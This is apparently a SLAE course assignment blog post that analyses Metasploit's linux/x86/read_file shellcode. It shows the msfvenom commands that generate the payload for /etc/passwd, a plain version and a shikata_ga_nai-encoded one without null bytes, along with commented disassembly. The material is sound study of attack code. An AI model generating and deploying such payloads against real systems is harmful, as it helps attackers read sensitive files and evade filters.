---
layout: post
title:  "SLAE Assignment 5.2 - Msfvenom linux/x86/read_file shellcode Analysis"
date:   2017-04-25
category: Certification
excerpt_separator: <!--more-->
hidden: true
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
### Assignment 5.2:  
  
**Our Goal:**  
> *Take up at least 3 linux/x86 shellcodes using Msfpayload (now Msfvenom)*
 - *Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode*
 - *Present your analysis*  
<!--more-->
  
Hello everybody,  
  
Here we are for the second analysis of our msf shellcodes.  Let's perform the analysis for the **linux/x86/read_file** shellcode:  
```bash
# msfvenom -p linux/x86/read_file --payload-options
Options for payload/linux/x86/read_file:


       Name: Linux Read File
     Module: payload/linux/x86/read_file
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 62
       Rank: Normal

Provided by:
    hal

Basic options:
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FD    1                yes       The file descriptor to write output to
PATH                   yes       The file path to read

Description:
  Read up to 4096 bytes from the local file system and write it back 
  out to the specified file descriptor
...
```
  
Let's examine the generated shellcode:  
```bash
# msfvenom -p linux/x86/read_file PATH=/etc/passwd -f raw | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 73 bytes

00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call dword 0x2
0000003D  2F                das
0000003E  657463            gs jz 0xa4
00000041  2F                das
00000042  7061              jo 0xa5
00000044  7373              jnc 0xb9
00000046  7764              ja 0xac
00000048  00                db 0x00
```
  
So let's comment our shellcode instructions:  
```nasm
    jmp short 0x38  ; jmp/call/pop technique
    mov eax,0x5     ; int open(const char *pathname, int flags);
    pop ebx         ; pop the @ of the string starting at 0x3D
    xor ecx,ecx     ; clears out ecx
    int 0x80        ; open syscall
    mov ebx,eax     ; file descriptor result of the open syscall
    mov eax,0x3     ; ssize_t read(int fd, void *buf, size_t count);
    mov edi,esp     ; 
    mov ecx,edi     ; pointer to a valid stack address
    mov edx,0x1000  ; size of buffer that will be read and buffered to the stack
    int 0x80        ; read syscall
    mov edx,eax     ; result of read and third argument of write function
    mov eax,0x4     ; ssize_t write(int fd, const void *buf, size_t count);
    mov ebx,0x1     ; standard output / ebx is still pointing to the buffer on stack
    int 0x80        ; write syscall
    mov eax,0x1     ; void _exit(int status);
    mov ebx,0x0     ; 0 everything is OK
    int 0x80        ; exit syscall
    call dword 0x2  ; pushing the @ of the following bytes (/etc/passwd) on the stack
    das
    gs jz 0xa4      
    das
    jo 0xa5
    jnc 0xb9
    ja 0xac
    db 0x00         ; null byte ending string
```
  
The jmp/call/pop technique will set the address of the following string in EBX:  
```bash
# echo -e \\x2F\\x65\\x74\\x63\\x2F\\x70\\x61\\x73\\x73\\x77\\x64
/etc/passwd
```
  
Once again you can generate a shellcode (quite more complex) without null bytes with the following command:  
```bash
# msfvenom -p linux/x86/read_file PATH=/etc/passwd -f raw -b \x00 | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 100 (iteration=0)
x86/shikata_ga_nai chosen with final size 100
Payload size: 100 bytes

00000000  BAF7BD341A        mov edx,0x1a34bdf7
00000005  DBDF              fcmovnu st7
00000007  D97424F4          fnstenv [esp-0xc]
0000000B  5E                pop esi
0000000C  29C9              sub ecx,ecx
0000000E  B113              mov cl,0x13
00000010  83EEFC            sub esi,byte -0x4
00000013  31560F            xor [esi+0xf],edx
00000016  0356F8            add edx,[esi-0x8]
00000019  5F                pop edi
0000001A  C1                db 0xc1
0000001B  F1                int1
0000001C  3018              xor [eax],bl
0000001E  2F                das
0000001F  06                push es
00000020  3C58              cmp al,0x58
00000022  6B37F5            imul esi,[edi],byte -0xb
00000025  95                xchg eax,ebp
00000026  0BBEC69E0FC1      or edi,[esi-0x3ef0613a]
0000002C  C8DE8626          enter 0x86de,0x26
00000030  41                inc ecx
00000031  27                daa
00000032  22A841D85364      and ch,[eax+0x6453d841]
00000038  E151              loope 0x8b
0000003A  91                xchg eax,ecx
0000003B  CE                into
0000003C  E561              in eax,0x61
0000003E  16                push ss
0000003F  2F                das
00000040  5E                pop esi
00000041  60                pushad
00000042  16                push ss
00000043  2F                das
00000044  A0AE9697A1        mov al,[0xa19796ae]
00000049  3097E71A3097      xor [edi-0x68cfe519],dl
0000004F  E75C              out 0x5c,eax
00000051  FC                cld
00000052  17                pop ss
00000053  0F9901            setns [ecx]
00000056  E82F0E9B63        call dword 0x639b0e8a
0000005B  B37F              mov bl,0x7f
0000005D  13ED              adc ebp,ebp
0000005F  40                inc eax
00000060  0CA4              or al,0xa4
00000062  89                db 0x89
00000063  A6                cmpsb
```
  
We can see, through the analysis of all of these shellcodes, the power of msfvenom while dynamically generating shellcodes.  
    
Hope you enjoyed this post, see you soon for the second msf shellcode analysis.  
  
[Phackt](https://twitter.com/phackt_ul)